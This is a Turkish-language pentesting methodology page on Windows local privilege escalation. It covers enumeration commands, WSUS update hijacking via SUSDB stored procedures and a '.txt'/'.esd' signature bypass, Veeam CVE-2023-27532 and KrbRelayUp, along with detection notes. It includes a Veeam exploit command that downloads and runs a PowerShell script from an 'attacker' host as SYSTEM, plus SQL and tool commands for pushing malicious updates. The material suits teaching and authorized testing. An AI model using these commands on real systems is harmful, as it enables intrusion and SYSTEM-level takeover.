# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, birkaç temel kaynaktaki genel Windows ayrıcalık yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik keşif akışı ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihî saldırı içeriğinde Windows ayrıcalık yükseltme üzerine DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## Windows Hakkında Temel Bilgiler

### Erişim Belirteçleri

**Windows erişim belirteçlerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi keşfetmenizi**, yürütülebilir dosyaları çalıştırmanızı ve hatta **etkinliklerinizin tespit edilmesini** **engelleyebilecek** çeşitli unsurlar bulunur. Ayrıcalık yükseltme keşfine başlamadan önce aşağıdaki **sayfayı okumalı** ve bu **savunma mekanizmalarının** tümünü **incelemelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol denetimleri atlatıldığında istem göstermeden High IL düzeyine ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection atlatma iş akışının ayrıntıları için buraya bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfî bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümlerinde, ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı bir **SMB keyfî port** LPE yolu da bulunur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

Mevcut bir PowerShell oturumundan yerel envanter çıkarmak için bkz. [.NET ile Windows Keşfi](../basic-powershell-for-pentesters/dotnet-enumeration.md). Bu örnekler, ayrı keşif yürütülebilir dosyaları başlatmadan aşağıdaki kontrolleri tamamlar.

### Sürüm bilgisi keşfi

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur; bu da bir Windows ortamının sunduğu **geniş saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve seçili olası güvenlik duyurularını envanterler; bir sonucu uygulanabilir kabul etmeden önce tam ürünü ve onun yerini alan güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için, işletim sistemi mimarisinin yanı sıra **çalışan sürecin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir süreç, [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine karşılık gelirken `%windir%\Sysnative`, bu sürecin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir süreçte kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, tek başına exploit edilebilirliği kanıtlamaz; çalışan derlemeyi, yüklü güncellemeyi veya onun yerini alan güncellemeyi, süreç mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

Hizmet belleği bozulmasına örnek olarak [istemcinin denetimindeki MIDI paylaşımlı bellek halkası ofsetlerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan yığın ofsetleri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` yetkisine ulaşmak, daha sonra [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ile `SYSTEM` yetkisine geçiş adımından farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kaydedilmiş herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Yazılabilir bir [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection), ayrı bir başlangıçta çalıştırma fırsatıdır; bunu privilege escalation olarak değerlendirmeden önce daha yetkili bir kullanıcının bu profili gerçekten yükleyip yüklemediğini kontrol edin.

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transkripsiyon ilkesi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transkripti incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transkript, kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transkript ancak içeriği kullanılabilir, daha yüksek ayrıcalıklara sahip bir kimliği ortaya çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell işlem hattı yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki yönergeleri izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin eksiksiz bir etkinlik kaydı ve tüm içeriği yakalanır; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu iz, adli incelemeler ve kötü amaçlı davranışların analiz edilmesi için değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için logging events, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki yönergelerde risk şu şekilde özetlenmişti:

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

HTTP WSUS uç noktası, güncelleme meta verilerinin araya girilmesine yönelik bir inceleme göstergesidir. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, bir saldırganın trafiği araya girip kesebileceğine veya kontrol edebileceğine ve istemcinin güncelleme güveni ile yükleme politikasına bağlıdır. Tek başına URL, kod yürütme olanağını kanıtlamaz. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Önce cmd'de aşağıdaki komutu çalıştırarak ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edin:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Orijinal uygulanabilirlik ifadesi şöyleydi:

Ardından, **bu açık kullanılabilir.** Son kayıt defteri değeri 0 ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP üzerinden araya girme yolu için bir ön koşulu doğrular; ancak araya girmenin, kötü amaçlı güncellemenin kabul edilmesinin veya yükseltilmiş yetkilerle kurulum yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, söz konusu ilkeyle yapılandırılan WSUS uç noktası seçilmez.

Bu güvenlik açıklarından yararlanmak için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar, SSL kullanılmayan WSUS trafiğine sahte güncellemeler enjekte etmek için hazırlanmış MiTM exploit betikleridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanır:

> Yerel kullanıcı proxy ayarımızı değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi araya almak ve varlığımızda yükseltilmiş yetkili bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus) aracını yerel olarak çalıştırabiliriz.
>
> Ayrıca WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini araya alabiliriz. WSUS, sertifikayı ilk kullanımda güvenilir sayan bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyor ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu güvenlik açığından [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla yararlanabilirsiniz (araç yayımlandığında).

### WSUS yöneticisinin denetimindeki güncellemeler

Geçerli kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol bulunur. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin; ardından onaylanmış güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yerel olarak yayımlanmış içerik için imzalama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içeriği imzalamak için kullanılan sertifikaya güvenmelidir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce aday güncellemenin imzalı ve kabul edilmiş olduğunu, hedef için geçerli olduğunu ve daha yüksek ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı, bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısının araya alınmasından farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncelleme yayımlayıp onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanabilecek erişime sahip olmaktır. Bu yola girmenin pratik yöntemlerinden biri, yukarı akıştaki bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır; tam ön koşul dağıtıma göre değişir, bu nedenle SQL administrator haklarını varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı aktarımını ve yordam izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Doğrudan tablo yazma işlemleri engellense bile sunucunun SQL rolü güncelleme yayımlama yordamlarına erişim sağlayabilir; `SUSDB` üzerinde başarısız olan bir `UPDATE` işlemi, yayımlamanın engellendiğini göstermez. Özel bir güncelleme denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve yordam izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve yüklü `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken faydalıdır. Bundle üst öğesi ve payload alt öğesinin her biri `UpdateIdentity` (parça türü `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revizyon kimliğini alın ve bundle ilişkisini, özet değerlerini, boyutu, içerik URL’sini ve revizyonu tutarlı tutun. Bu, durum bilgisi tutan bir yayımlama iş akışıdır; bu nedenle depolanmış bir prosedür çağrısının başarılı olması, istemci tarafında yürütme gerçekleştiğini kanıtlamaz.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturun, hedefleyin ve onaylayın

Özel güncelleme iş akışı, kısıtlı bir yayımlama API’si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili depolanmış prosedürler |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubunu listeleme/oluşturma ve istemciyi ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özet değerleri, boyut ve `CommandLineInstallation` handler’ı, içe aktarılan meta veriler ve parçalar arasında birbiriyle uyumlu olmalıdır. İçerik URL’sini ve hedef grubunu atadıktan sonra, son onay aşağıdakine benzer; örnek GUID’leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı tabanlı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD imajı olduğu önceden kanıtlanmadan `CheckCertificateSignature` atlanır. Bu nedenle `payload.exe.txt` gibi yeniden adlandırılmamış bir PE, içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu hazırlama ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kaydedilen içeriği getirir. Kaynak sunucu, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS senkronizasyonu `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i çalıştırmak üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik hazırlama için `BitsWebServer.py` sunar. Yetkili bir laboratuvarda kullanılabilecek minimal bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkeye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` bölümündeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmesine gerek kalmadan yapılandırılmış zamanlamaya göre indirilip yüklenmesini sağlar. Test sırasında, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback işlemi sona erdikten hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı tekrarlanan yürütme kalıcılığına dönüşebilir. İstemci, güncelleme başarısız durumunu gösterdiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve hardening pivotları

Bu zincirden elde edilebilecek faydalı sunucu ve istemci tarafı pivotları şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütmelerini denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen principal'lar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yazım hatalı `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı uzantı ve içeriğin magic değerleriyle ilişkilendirin, uzantıya güvenmeyin.
- Windows Update yüklemelerinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adları taşıyan içerikten kaynaklanan PE yürütmesini ya da beklenmeyen alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği durumlarda veritabanı hizmetinde Authentication için Extended Protection gerektirin ve veritabanı ağına erişimi WSUS sunucusu ile yetkili yönetim sistemleriyle kısıtlayın. Özel güncelleme prosedürlerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Auto-Updater'lar ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC arayüzü ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi bir saldırganın sunucusuna yönlendirilebiliyorsa ve updater sahte bir root CA'ya veya zayıf imza denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetine kötü amaçlı bir MSI yükletebilir. Genelleştirilmiş bir teknik için (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü özgün açıklama ve keşif notu şöyleydi:

Veeam B&R < `11.0.1.1261`, **TCP/9401** üzerinde saldırgan denetimindeki mesajları işleyen bir localhost hizmeti sunar ve **NT AUTHORITY\SYSTEM** olarak rastgele komutlara izin verir.<sup>[[12]](#references)</sup>

- **Keşif**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde bir çekirdek yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Keşif**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından yüklenen ürünü ve yama üstverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipuçlarıdır; yama kontrolü için tek başlarına yeterli değildir.
- **Düzeltilmiş sürümlerin alt sınırları**: Veeam, ilk düzeltilmiş sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; daha eski sürümler etkilenir. Dört parçalı dosya sürümü tek başına aynı build numaralarındaki yamalanmamış temel sürümle daha sonraki bir yamayı ayırt edemez. Sınır build'inin düzeltildiğini belirtmeden önce yama tanımlayıcısını [satıcı build geçmişi](https://www.veeam.com/kb2680) ile doğrulayın.
- **Exploit**: Gerekli Veeam DLL'leriyle birlikte `VeeamHax.exe` gibi bir PoC'yi aynı dizine yerleştirin, ardından yerel soket üzerinden SYSTEM payload'ını tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis komutu SYSTEM olarak yürütür.

Atıfta bulunulan PoC, ek ön koşullar sağlandığında komutların SYSTEM olarak yürütülebildiğini gösterir; üreticinin güvenlik duyurusu kimlik bilgilerinin ifşa edilmesi sorununu açıklar.

## KrbRelayUp

Varsayılan ortamla ilgili ilk açıklama şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing'in zorunlu kılınmadığı**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve aktarılan principal hedef nesne üzerinde haklara sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini ele alır; KrbRelayUp bu yollardan bazılarını otomatikleştirir. RBCD zinciri, geçerli delegation ve hedef nesne haklarını gerektirirken shadow-credential zinciri, key-credential yazma haklarını ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca domain üyeliğinden kaynaklanmaz.

